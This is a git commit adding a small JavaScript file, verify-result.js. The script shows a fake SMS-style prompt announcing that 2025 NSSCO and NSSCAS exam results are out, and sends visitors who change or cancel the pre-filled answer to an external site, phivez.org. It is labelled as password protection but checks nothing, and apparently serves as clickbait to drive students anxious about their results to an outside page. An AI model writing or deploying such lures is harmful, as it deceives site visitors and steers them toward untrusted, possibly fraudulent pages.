298923688c4599a7e9c7047c944545c405894219
newblog13 <sweet16guyz@gmail.com>
2026-01-13 07:40:04 +0100

    Create verify-result.js

---
+++ verify-result.js
@@ -0,0 +1,13 @@
+ <script>
+    
+      
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'CHECK RESULT'
+password = prompt(
+  'SMS: Congratulations! 2025 NSSCO AND NSSCAS Results is Out Press Ok to Access your Result now.',
+  'CHECK RESULT'
+);
+if (password != 'CHECK RESULT') {
+  location.href = 'https://phivez.org/nssco-nsscas.html';
+}
+  </script>
